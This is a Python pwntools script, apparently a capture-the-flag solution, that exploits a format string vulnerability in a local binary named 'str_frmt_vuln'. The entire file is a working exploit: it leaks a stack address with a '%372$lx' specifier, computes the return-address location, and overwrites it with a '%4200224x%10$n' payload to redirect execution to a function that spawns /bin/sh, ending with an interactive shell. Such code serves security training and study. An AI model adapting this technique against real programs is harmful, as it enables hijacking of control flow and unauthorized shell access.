import pwnlib.tubes.process as process
from pwnlib.context import context
import sys
sys.path.append("../../")
from tools.nc_tools.interactive_nc import InteractiveNC

context.bits = 64
# nc = "c.unitedctf.ca"
# port = 10033
# r = remote.remote(nc,port)
r = process.process(["./str_frmt_vuln"])

interactive = InteractiveNC(r, command_prefix="!")

interactive.add_input("!b")
interactive.add_input("0")
# Leaks an address from the stack
interactive.add_input("%372$lx")
interactive.add_input("!i")
interactive.add_input("!s 2 all addr")
# Offset of the stack return address to the leaked address
interactive.add_input("!v off 3368")
interactive.add_input("!10 addr")
interactive.add_input("!+ addr off return_addr")
# %4200224x = 0x401720 <- return_addr of exec func with /bin/sh
# %10$n = 10 <- write to the address at the 10th argument
# 12 <- padding to reach the 10th argument
interactive.add_input("!v payload %4200224x%10$n12")
interactive.add_input("!16 return_addr")
interactive.add_input("!e util.packing.p64(int(return_addr, 16))")
# append the stack return address to the payload
interactive.add_input("!a payload last_eval_res fmtstr_payload")
interactive.add_input("!d hex")
interactive.add_input("!b")
interactive.add_input("0")
interactive.add_input("!fmtstr_payload")
#Tada!! You got a shell
interactive.interactive()
